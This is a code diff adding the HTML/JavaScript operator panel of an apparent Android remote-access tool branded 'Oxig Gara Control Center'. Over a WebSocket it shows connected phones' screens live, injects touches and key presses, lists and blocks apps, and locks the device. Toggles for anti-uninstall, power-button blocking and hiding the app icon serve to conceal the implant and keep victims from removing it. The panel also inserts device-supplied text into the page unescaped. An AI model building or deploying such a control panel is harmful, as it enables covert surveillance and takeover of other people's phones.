@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Oxig Gara Control Center</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: #0a0a0f;
+            color: #fff;
+            min-height: 100vh;
+        }
+        .header {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            padding: 15px 20px;
+            border-bottom: 2px solid #e94560;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .header h1 { font-size: 22px; color: #e94560; }
+        .header .sub { color: #666; font-size: 12px; }
+        .header .status { display: flex; align-items: center; gap: 8px; font-size: 13px; }
+        .dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; }
+        .dot.green { background: #00ff88; box-shadow: 0 0 10px #00ff88; }
+        .dot.red { background: #e94560; }
+        
+        .container { display: flex; height: calc(100vh - 60px); }
+        
+        /* Sidebar */
+        .sidebar {
+            width: 300px;
+            background: #111;
+            border-right: 1px solid #222;
+            overflow-y: auto;
+            flex-shrink: 0;
+        }
+        .sidebar-header {
+            padding: 12px 15px;
+            border-bottom: 1px solid #222;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .sidebar-header h3 { color: #e94560; font-size: 14px; }
+        .badge { background: #e94560; color: #fff; padding: 2px 8px; border-radius: 10px; font-size: 11px; }
+        
+        .device-card {
+            padding: 12px 15px;
+            border-bottom: 1px solid #1a1a1a;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .device-card:hover { background: #1a1a2e; }
+        .device-card.active { background: #1a2e1a; border-left: 3px solid #00ff88; }
+        .device-card .name { font-weight: 600; font-size: 14px; }
+        .device-card .info { font-size: 11px; color: #666; margin-top: 3px; }
+        .device-card .status-badge { font-size: 10px; color: #00ff88; margin-top: 3px; }
+        
+        /* Main Panel */
+        .main-panel {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        
+        .tab-bar {
+            display: flex;
+            background: #111;
+            border-bottom: 1px solid #222;
+            overflow-x: auto;
+        }
+        .tab-btn {
+            padding: 12px 20px;
+            background: none;
+            border: none;
+            color: #666;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 500;
+            border-bottom: 2px solid transparent;
+            transition: all 0.3s;
+            white-space: nowrap;
+        }
+        .tab-btn:hover { color: #fff; }
+        .tab-btn.active { color: #e94560; border-bottom-color: #e94560; }
+        
+        .tab-content { flex: 1; display: none; overflow: auto; padding: 15px; }
+        .tab-content.active { display: flex; flex-direction: column; }
+        
+        /* Live Screen Tab */
+        .screen-frame {
+            width: 100%;
+            max-width: 450px;
+            aspect-ratio: 9/19.5;
+            background: #000;
+            border-radius: 20px;
+            border: 2px solid #333;
+            overflow: hidden;
+            position: relative;
+            margin: 0 auto;
+            cursor: crosshair;
+        }
+        #screenCanvas { width: 100%; height: 100%; display: block; background: #111; }
+        .placeholder {
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%);
+            text-align: center; color: #333; pointer-events: none;
+        }
+        .placeholder .icon { font-size: 48px; }
+        .control-buttons {
+            display: flex; gap: 8px; justify-content: center; margin-top: 12px; flex-wrap: wrap;
+        }
+        .ctrl-btn {
+            padding: 8px 18px; border: none; border-radius: 15px; font-size: 12px;
+            font-weight: 600; cursor: pointer; transition: all 0.2s;
+        }
+        .ctrl-btn:active { transform: scale(0.95); }
+        .ctrl-btn.primary { background: #e94560; color: #fff; }
+        .ctrl-btn.success { background: #00ff88; color: #000; }
+        .ctrl-btn.secondary { background: #333; color: #fff; }
+        .ctrl-btn.warning { background: #ffa500; color: #000; }
+        
+        /* Device Info Tab */
+        .info-grid {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 10px; max-width: 500px;
+        }
+        .info-card {
+            background: #1a1a2e; padding: 12px; border-radius: 10px; border: 1px solid #222;
+        }
+        .info-card .label { font-size: 11px; color: #666; }
+        .info-card .value { font-size: 14px; font-weight: 500; margin-top: 3px; }
+        
+        /* Apps Tab */
+        .app-grid {
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+            gap: 10px; max-width: 600px;
+        }
+        .app-item {
+            background: #1a1a2e; border-radius: 10px; padding: 10px;
+            text-align: center; border: 1px solid #222;
+        }
+        .app-item .icon { font-size: 28px; }
+        .app-item .name { font-size: 11px; margin-top: 5px; color: #ccc; }
+        .app-item .block-btn {
+            margin-top: 8px; padding: 4px 12px; border: none; border-radius: 8px;
+            font-size: 10px; cursor: pointer; transition: all 0.2s;
+        }
+        .app-item .block-btn.blocked { background: #e94560; color: #fff; }
+        .app-item .block-btn.unblocked { background: #333; color: #888; }
+        
+        /* Features Tab */
+        .feature-card {
+            background: #1a1a2e; padding: 15px; border-radius: 10px;
+            border: 1px solid #222; margin-bottom: 10px; max-width: 500px;
+        }
+        .feature-card .header {
+            display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px;
+        }
+        .feature-card .title { font-weight: 600; }
+        .feature-card .desc { font-size: 12px; color: #666; }
+        
+        .toggle {
+            width: 44px; height: 24px; background: #333; border-radius: 12px;
+            position: relative; cursor: pointer; transition: all 0.3s;
+        }
+        .toggle.on { background: #00ff88; }
+        .toggle::after {
+            content: ''; width: 20px; height: 20px; background: #fff; border-radius: 50%;
+            position: absolute; top: 2px; left: 2px; transition: all 0.3s;
+        }
+        .toggle.on::after { left: 22px; }
+        
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: #111; }
+        ::-webkit-scrollbar-thumb { background: #333; border-radius: 2px; }
+        
+        @media (max-width: 700px) {
+            .container { flex-direction: column; }
+            .sidebar { width: 100%; max-height: 150px; }
+            .screen-frame { max-width: 90vw; }
+            .info-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div>
+            <h1>⚡ Oxig Control Center</h1>
+            <div class="sub">Dev By Oxig Gara™</div>
+        </div>
+        <div class="status">
+            <span id="connDot" class="dot red"></span>
+            <span id="connText">Disconnected</span>
+        </div>
+    </div>
+    
+    <div class="container">
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <h3>📡 Devices</h3>
+                <span class="badge" id="deviceCount">0</span>
+            </div>
+            <div id="deviceList">
+                <div style="color:#444;padding:30px;text-align:center;font-size:13px;">
+                    Waiting for devices...
+                </div>
+            </div>
+        </div>
+        
+        <!-- Main Panel -->
+        <div class="main-panel">
+            <div class="tab-bar">
+                <button class="tab-btn active" data-tab="livescreen">📺 Live Screen</button>
+                <button class="tab-btn" data-tab="control">🎮 Live Control</button>
+                <button class="tab-btn" data-tab="info">ℹ️ Device Info</button>
+                <button class="tab-btn" data-tab="apps">📱 Apps</button>
+                <button class="tab-btn" data-tab="features">🔐 Features</button>
+            </div>
+            
+            <!-- Live Screen Tab -->
+            <div class="tab-content active" id="tab-livescreen">
+                <div class="screen-frame" id="screenFrame">
+                    <canvas id="screenCanvas"></canvas>
+                    <div class="placeholder" id="placeholder">
+                        <div class="icon">📱</div>
+                        <p>Select a device<br><span style="font-size:11px;">to view live screen</span></p>
+                    </div>
+                </div>
+                <div class="control-buttons">
+                    <button class="ctrl-btn success" id="btnHome">🏠 Home</button>
+                    <button class="ctrl-btn secondary" id="btnBack">↩ Back</button>
+                    <button class="ctrl-btn warning" id="btnRecents">📋 Recents</button>
+                </div>
+            </div>
+            
+            <!-- Live Control Tab -->
+            <div class="tab-content" id="tab-control">
+                <div class="screen-frame" id="controlFrame" style="max-width:350px;">
+                    <canvas id="controlCanvas"></canvas>
+                    <div class="placeholder">
+                        <div class="icon">🖱️</div>
+                        <p>Touch & drag to control device<br><span style="font-size:11px;">Select a device first</span></p>
+                    </div>
+                </div>
+                <div class="control-buttons">
+                    <button class="ctrl-btn primary" id="btnSwipeUp">⬆ Swipe Up</button>
+                    <button class="ctrl-btn primary" id="btnSwipeDown">⬇ Swipe Down</button>
+                    <button class="ctrl-btn primary" id="btnLongPress">👆 Long Press</button>
+                </div>
+            </div>
+            
+            <!-- Device Info Tab -->
+            <div class="tab-content" id="tab-info">
+                <div id="deviceInfoContent">
+                    <div style="color:#444;padding:20px;text-align:center;">Select a device to see info</div>
+                </div>
+            </div>
+            
+            <!-- Apps Tab -->
+            <div class="tab-content" id="tab-apps">
+                <div style="margin-bottom:10px;">
+                    <button class="ctrl-btn secondary" id="btnRefreshApps">🔄 Refresh Apps</button>
+                </div>
+                <div class="app-grid" id="appsGrid">
+                    <div style="color:#444;padding:20px;text-align:center;">Select a device and refresh</div>
+                </div>
+            </div>
+            
+            <!-- Features Tab -->
+            <div class="tab-content" id="tab-features">
+                <div class="feature-card">
+                    <div class="header">
+                        <span class="title">🛡️ Anti-Uninstall</span>
+                        <div class="toggle" id="toggleAntiUninstall" data-feature="anti_uninstall"></div>
+                    </div>
+                    <div class="desc">Prevent app from being uninstalled (auto back)</div>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="header">
+                        <span class="title">🔌 Power Button Block</span>
+                        <div class="toggle" id="togglePowerBlock" data-feature="power_block"></div>
+                    </div>
+                    <div class="desc">Block power button long press</div>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="header">
+                        <span class="title">🔒 Lock Device</span>
+                        <button class="ctrl-btn warning" id="btnLockDevice" style="padding:6px 16px;">LOCK NOW</button>
+                    </div>
+                    <div class="desc">Immediately lock the device screen</div>
+                </div>
+                
+                <div class="feature-card" style="border-color:#e94560;">
+                    <div class="header">
+                        <span class="title">📱 Hide/Show App Icon</span>
+                        <div class="toggle" id="toggleHideApp" data-feature="hide_app"></div>
+                    </div>
+                    <div class="desc">Hide app from launcher (Android 5-16)</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // ============================
+        // OXIG GARA CONTROL CENTER
+        // ============================
+        
+        let ws = null;
+        let selectedDeviceId = null;
+        let canvas = document.getElementById('screenCanvas');
+        let ctx = canvas.getContext('2d');
+        let controlCanvas = document.getElementById('controlCanvas');
+        let controlCtx = controlCanvas.getContext('2d');
+        let isDragging = false;
+        
+        // === WebSocket Connection ===
+        function connect() {
+            const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const url = proto + '//' + location.host;
+            
+            ws = new WebSocket(url);
+            
+            ws.onopen = () => {
+                ws.send('ADMIN:connected\n');
+                updateConnectionStatus(true);
+            };
+            
+            ws.onmessage = (event) => {
+                if (event.data instanceof Blob) {
+                    const reader = new FileReader();
+                    reader.onload = (e) => {
+                        const img = new Image();
+                        img.onload = () => {
+                            canvas.width = img.width;
+                            canvas.height = img.height;
+                            controlCanvas.width = img.width;
+                            controlCanvas.height = img.height;
+                            ctx.drawImage(img, 0, 0);
+                            controlCtx.drawImage(img, 0, 0);
+                            document.getElementById('placeholder').style.display = 'none';
+                        };
+                        img.src = e.target.result;
+                    };
+                    reader.readAsDataURL(event.data);
+                } else {
+                    try { handleMessage(JSON.parse(event.data)); }
+                    catch(e) { console.log('Text:', event.data); }
+                }
+            };
+            
+            ws.onclose = () => {
+                updateConnectionStatus(false);
+                setTimeout(connect, 3000);
+            };
+            
+            ws.onerror = () => updateConnectionStatus(false);
+        }
+        
+        function handleMessage(msg) {
+            switch(msg.type) {
+                case 'device_list':
+                    updateDeviceList(msg.devices);
+                    break;
+                case 'disconnected':
+                    if (msg.deviceId === selectedDeviceId) {
+                        selectedDeviceId = null;
+                        document.getElementById('placeholder').style.display = 'block';
+                    }
+                    break;
+                case 'device_selected':
+                    break;
+                case 'device_info':
+                    showDeviceInfo(msg.info);
+                    break;
+                case 'device_apps':
+                    showAppsList(msg.apps);
+                    break;
+                case 'blocked_apps':
+                    updateBlockedApps(msg.apps);
+                    break;
+            }
+        }
+        
+        function updateConnectionStatus(connected) {
+            const dot = document.getElementById('connDot');
+            const text = document.getElementById('connText');
+            dot.className = 'dot ' + (connected ? 'green' : 'red');
+            text.textContent = connected ? 'Connected' : 'Disconnected';
+        }
+        
+        function updateDeviceList(devices) {
+            const list = document.getElementById('deviceList');
+            document.getElementById('deviceCount').textContent = devices ? devices.length : 0;
+            
+            if (!devices || devices.length === 0) {
+                list.innerHTML = '<div style="color:#444;padding:30px;text-align:center;">No devices connected</div>';
+                return;
+            }
+            
+            let html = '';
+            devices.forEach(d => {
+                const active = d.id === selectedDeviceId ? 'active' : '';
+                html += `
+                    <div class="device-card ${active}" onclick="selectDevice('${d.id}')">
+                        <div class="name">${d.name}</div>
+                        <div class="info">${d.model} • Android ${d.androidVersion}</div>
+                        <div class="status-badge">● Online</div>
+                    </div>
+                `;
+            });
+            list.innerHTML = html;
+        }
+        
+        function selectDevice(deviceId) {
+            selectedDeviceId = deviceId;
+            
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({ type: 'select_device', deviceId: deviceId }));
+                ws.send(JSON.stringify({ type: 'get_apps', deviceId: deviceId }));
+            }
+            
+            document.querySelectorAll('.device-card').forEach(el => {
+                el.classList.toggle('active', el.textContent.includes(deviceId));
+            });
+        }
+        
+        function showDeviceInfo(info) {
+            const container = document.getElementById('deviceInfoContent');
+            container.innerHTML = `
+                <div class="info-grid">
+                    <div class="info-card">
+                        <div class="label">Device ID</div>
+                        <div class="value">${info.id}</div>
+                    </div>
+                    <div class="info-card">
+                        <div class="label">Model</div>
+                        <div class="value">${info.model}</div>
+                    </div>
+                    <div class="info-card">
+                        <div class="label">Android Version</div>
+                        <div class="value">${info.androidVersion}</div>
+                    </div>
+                    <div class="info-card">
+                        <div class="label">API Level</div>
+                        <div class="value">${info.apiLevel}</div>
+                    </div>
+                    <div class="info-card">
+                        <div class="label">IP Address</div>
+                        <div class="value">${info.ip}</div>
+                    </div>
+                    <div class="info-card">
+                        <div class="label">Connected Since</div>
+                        <div class="value">${new Date(info.connectedAt).toLocaleTimeString()}</div>
+                    </div>
+                    <div class="info-card">
+                        <div class="label">Installed Apps</div>
+                        <div class="value">${info.appsCount || 0}</div>
+                    </div>
+                </div>
+            `;
+        }
+        
+        function showAppsList(apps) {
+            const grid = document.getElementById('appsGrid');
+            if (!apps || apps.length === 0) {
+                grid.innerHTML = '<div style="color:#444;padding:20px;">No apps found</div>';
+                return;
+            }
+            
+            let html = '';
+            apps.forEach(app => {
+                const blocked = window.blockedAppList && window.blockedAppList.includes(app.package);
+                html += `
+                    <div class="app-item">
+                        <div class="icon">${app.icon || '📱'}</div>
+                        <div class="name">${app.name}</div>
+                        <button class="block-btn ${blocked ? 'blocked' : 'unblocked'}"
+                                onclick="toggleAppBlock('${app.package}', ${!blocked})">
+                            ${blocked ? '🔴 Blocked' : '⚪ Block'}
+                        </button>
+                    </div>
+                `;
+            });
+            grid.innerHTML = html;
+        }
+        
+        window.blockedAppList = [];
+        
+        function updateBlockedApps(apps) {
+            window.blockedAppList = apps[selectedDeviceId] || [];
+            // Refresh apps grid if visible
+            document.querySelectorAll('.app-item').forEach(el => {
+                // Update visuals
+            });
+        }
+        
+        function toggleAppBlock(packageName, block) {
+            if (ws && selectedDeviceId) {
+                ws.send(JSON.stringify({
+                    type: 'block_app',
+                    deviceId: selectedDeviceId,
+                    package: packageName,
+                    block: block
+                }));
+            }
+        }
+        
+        // === Touch Events ===
+        function getCoords(e, canvasEl) {
+            const rect = canvasEl.getBoundingClientRect();
+            const cx = e.clientX || (e.touches && e.touches[0].clientX);
+            const cy = e.clientY || (e.touches && e.touches[0].clientY);
+            return {
+                x: (cx - rect.left) / rect.width,
+                y: (cy - rect.top) / rect.height,
+                absX: cx - rect.left,
+                absY: cy - rect.top
+            };
+        }
+        
+        function sendTouch(action, x, y) {
+            if (!ws || !selectedDeviceId) return;
+            ws.send(JSON.stringify({
+                type: 'touch', deviceId: selectedDeviceId,
+                action: action, x: Math.round(x * 10000) / 10000,
+                y: Math.round(y * 10000) / 10000
+            }));
+        }
+        
+        // Mouse events on both canvases
+        [canvas, controlCanvas].forEach(c => {
+            c.addEventListener('mousedown', (e) => {
+                if (!selectedDeviceId) return;
+                isDragging = true;
+                const coord = getCoords(e, c);
+                sendTouch(0, coord.x, coord.y);
+            });
+            
+            c.addEventListener('mousemove', (e) => {
+                if (!isDragging || !selectedDeviceId) return;
+                const coord = getCoords(e, c);
+                sendTouch(2, coord.x, coord.y);
+            });
+            
+            c.addEventListener('mouseup', (e) => {
+                if (!selectedDeviceId) return;
+                isDragging = false;
+                const coord = getCoords(e, c);
+                sendTouch(1, coord.x, coord.y);
+            });
+            
+            c.addEventListener('touchstart', (e) => {
+                e.preventDefault();
+                if (!selectedDeviceId) return;
+                const coord = getCoords(e, c);
+                sendTouch(0, coord.x, coord.y);
+            }, {passive: false});
+            
+            c.addEventListener('touchmove', (e) => {
+                e.preventDefault();
+                if (!selectedDeviceId) return;
+                const coord = getCoords(e, c);
+                sendTouch(2, coord.x, coord.y);
+            }, {passive: false});
+            
+            c.addEventListener('touchend', (e) => {
+                e.preventDefault();
+                if (!selectedDeviceId) return;
+                sendTouch(1, -1, -1);
+            }, {passive: false});
+        });
+        
+        // === Tab Switching ===
+        document.querySelectorAll('.tab-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+                document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+                btn.classList.add('active');
+                document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
+            });
+        });
+        
+        // === Buttons ===
+        document.getElementById('btnHome').addEventListener('click', () => {
+            if (ws && selectedDeviceId) ws.send(JSON.stringify({type:'key',deviceId:selectedDeviceId,keyCode:3}));
+        });
+        document.getElementById('btnBack').addEventListener('click', () => {
+            if (ws && selectedDeviceId) ws.send(JSON.stringify({type:'key',deviceId:selectedDeviceId,keyCode:4}));
+        });
+        document.getElementById('btnRecents').addEventListener('click', () => {
+            if (ws && selectedDeviceId) ws.send(JSON.stringify({type:'key',deviceId:selectedDeviceId,keyCode:187}));
+        });
+        document.getElementById('btnSwipeUp').addEventListener('click', () => {
+            if (ws && selectedDeviceId) {
+                ws.send(JSON.stringify({type:'touch',deviceId:selectedDeviceId,action:0,x:0.5,y:0.8}));
+                setTimeout(() => {
+                    ws.send(JSON.stringify({type:'touch',deviceId:selectedDeviceId,action:2,x:0.5,y:0.2}));
+                    ws.send(JSON.stringify({type:'touch',deviceId:selectedDeviceId,action:1,x:0.5,y:0.2}));
+                }, 100);
+            }
+        });
+        document.getElementById('btnSwipeDown').addEventListener('click', () => {
+            if (ws && selectedDeviceId) {
+                ws.send(JSON.stringify({type:'touch',deviceId:selectedDeviceId,action:0,x:0.5,y:0.2}));
+                setTimeout(() => {
+                    ws.send(JSON.stringify({type:'touch',deviceId:selectedDeviceId,action:2,x:0.5,y:0.8}));
+                    ws.send(JSON.stringify({type:'touch',deviceId:selectedDeviceId,action:1,x:0.5,y:0.8}));
+                }, 100);
+            }
+        });
+        document.getElementById('btnLongPress').addEventListener('click', () => {
+            if (ws && selectedDeviceId) {
+                ws.send(JSON.stringify({type:'touch',deviceId:selectedDeviceId,action:0,x:0.5,y:0.5}));
+                setTimeout(() => {
+                    ws.send(JSON.stringify({type:'touch',deviceId:selectedDeviceId,action:1,x:0.5,y:0.5}));
+                }, 800);
+            }
+        });
+        document.getElementById('btnRefreshApps').addEventListener('click', () => {
+            if (ws && selectedDeviceId) ws.send(JSON.stringify({type:'get_apps',deviceId:selectedDeviceId}));
+        });
+        document.getElementById('btnLockDevice').addEventListener('click', () => {
+            if (ws && selectedDeviceId) ws.send(JSON.stringify({type:'lock_device',deviceId:selectedDeviceId}));
+        });
+        
+        // === Toggles ===
+        document.querySelectorAll('.toggle').forEach(toggle => {
+            toggle.addEventListener('click', () => {
+                const feature = toggle.dataset.feature;
+                const isOn = toggle.classList.toggle('on');
+                
+                if (feature === 'anti_uninstall' && ws && selectedDeviceId) {
+                    ws.send(JSON.stringify({type:'anti_uninstall',deviceId:selectedDeviceId,enable:isOn}));
+                } else if (feature === 'power_block' && ws && selectedDeviceId) {
+                    ws.send(JSON.stringify({type:'power_block',deviceId:selectedDeviceId,enable:isOn}));
+                } else if (feature === 'hide_app') {
+                    // Can hide via DeviceAdmin or package manager
+                    alert('App hide requires launcher restart');
+                }
+            });
+        });
+        
+        // === Start ===
+        connect();
+    </script>
+</body>
+</html>
